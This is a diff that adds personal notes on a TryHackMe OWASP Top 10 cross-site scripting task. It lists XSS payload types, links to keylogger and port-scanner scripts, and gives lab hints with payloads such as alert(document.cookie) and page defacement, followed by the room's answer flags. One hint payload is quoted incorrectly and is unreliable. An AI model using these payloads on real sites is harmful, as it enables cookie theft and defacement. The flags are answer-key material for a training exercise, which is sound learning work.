@@ -38,6 +38,47 @@ google search Pensive Notes Credentials
 http://10.10.84.210/reflected?keyword=%3Cscript%3Ealert(%E2%80%9CHello%20World%E2%80%9D)%3C/script%3E
 
 
+Task 20 [Severity 7] Cross-site Scripting 
+XSS Payloads
+Remember, cross-site scripting is a vulnerability that can be exploited to execute malicious Javascript on a victim’s machine. Check out some common payloads types used:
+
+    Popup's (<script>alert(“Hello World”)</script>) - Creates a Hello World message popup on a users browser.
+    Writing HTML (document.write) - Override the website's HTML to add your own (essentially defacing the entire page).
+    XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) - You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage.
+    Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) - A mini local port scanner (more information on this is covered in the TryHackMe XSS room).
+
+XSS-Payloads.com (http://www.xss-payloads.com/) is a website that has XSS related Payloads, Tools, Documentation and more. You can download XSS payloads that take snapshots from a webcam or even get a more capable port and network scanner.
+
+
+- Navigate to http://10.10.117.248/ in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello".
+hint: <script>alert(“Hello World”)</script>
+ThereIsMoreToXSSThanYouThink
+
+
+- On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.
+hint:<script>alert(“window.location.hostname”)</script>
+ReflectiveXss4TheWin
+
+
+
+- Now navigate to http://10.10.117.248/ in your browser and click on the "Stored XSS" tab on the navbar; make an account.
+Then add a comment and see if you can insert some of your own HTML.
+hint: use html
+<b>iam gadoi </b>
+<i>iam gadoi </i>
+HTML_T4gs
+
+
+
+- On the same page, create an alert popup box appear on the page with your document cookies.
+hint: <script>alert(document.cookie)</script>
+W3LL_D0N3_LVL2
+
+
+- Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.
+hint: <script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>
+websites_can_be_easily_defaced_with_xss
+
 https://tryhackme.com/room/owasptop10
 https://h0j3n.medium.com/tryhackme-owasp-top-10-5d168ff0563b
 https://musyokaian.medium.com/owasp-top-10-tryhackme-b7d02f29254b
